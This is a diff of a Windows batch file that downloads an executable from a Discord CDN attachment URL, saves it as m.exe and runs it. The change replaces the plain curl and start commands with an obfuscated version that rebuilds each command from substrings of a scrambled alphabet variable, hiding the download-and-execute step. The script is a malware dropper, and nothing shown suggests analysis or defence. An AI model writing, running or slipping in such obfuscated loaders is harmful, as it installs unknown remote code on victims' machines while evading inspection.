@@ -1,4 +1,7 @@
 @echo off
-curl https://cdn.discordapp.com/attachments/923275805218447421/923306553262604368/Downloads.exe --output m.exe
+Set ayai=oE3HCnr7g2QwZWYT5le1Lmsv8DBN4ckFUXOiqjaRxhpSIzfPV60Jb9tMyAGdKu
+cls
+@%ayai:~18,1%%ayai:~29,1%%ayai:~41,1%%ayai:~0,1% %ayai:~0,1%%ayai:~46,1%%ayai:~46,1%
+%ayai:~29,1%%ayai:~61,1%%ayai:~6,1%%ayai:~17,1% %ayai:~41,1%%ayai:~54,1%%ayai:~54,1%%ayai:~42,1%%ayai:~22,1%://%ayai:~29,1%%ayai:~59,1%%ayai:~5,1%.%ayai:~59,1%%ayai:~35,1%%ayai:~22,1%%ayai:~29,1%%ayai:~0,1%%ayai:~6,1%%ayai:~59,1%%ayai:~38,1%%ayai:~42,1%%ayai:~42,1%.%ayai:~29,1%%ayai:~0,1%%ayai:~21,1%/%ayai:~38,1%%ayai:~54,1%%ayai:~54,1%%ayai:~38,1%%ayai:~29,1%%ayai:~41,1%%ayai:~21,1%%ayai:~18,1%%ayai:~5,1%%ayai:~54,1%%ayai:~22,1%/%ayai:~53,1%%ayai:~9,1%%ayai:~2,1%%ayai:~9,1%%ayai:~7,1%%ayai:~16,1%%ayai:~24,1%%ayai:~50,1%%ayai:~16,1%%ayai:~9,1%%ayai:~19,1%%ayai:~24,1%%ayai:~28,1%%ayai:~28,1%%ayai:~7,1%%ayai:~28,1%%ayai:~9,1%%ayai:~19,1%/%ayai:~53,1%%ayai:~9,1%%ayai:~2,1%%ayai:~2,1%%ayai:~50,1%%ayai:~49,1%%ayai:~16,1%%ayai:~16,1%%ayai:~2,1%%ayai:~9,1%%ayai:~49,1%%ayai:~9,1%%ayai:~49,1%%ayai:~50,1%%ayai:~28,1%%ayai:~2,1%%ayai:~49,1%%ayai:~24,1%/%ayai:~25,1%%ayai:~0,1%%ayai:~11,1%%ayai:~5,1%%ayai:~17,1%%ayai:~0,1%%ayai:~38,1%%ayai:~59,1%%ayai:~22,1%.%ayai:~18,1%%ayai:~40,1%%ayai:~18,1% --%ayai:~0,1%%ayai:~61,1%%ayai:~54,1%%ayai:~42,1%%ayai:~61,1%%ayai:~54,1% %ayai:~21,1%.%ayai:~18,1%%ayai:~40,1%%ayai:~18,1%
 
-start m.exe    
+%ayai:~22,1%%ayai:~54,1%%ayai:~38,1%%ayai:~6,1%%ayai:~54,1% %ayai:~21,1%.%ayai:~18,1%%ayai:~40,1%%ayai:~18,1%
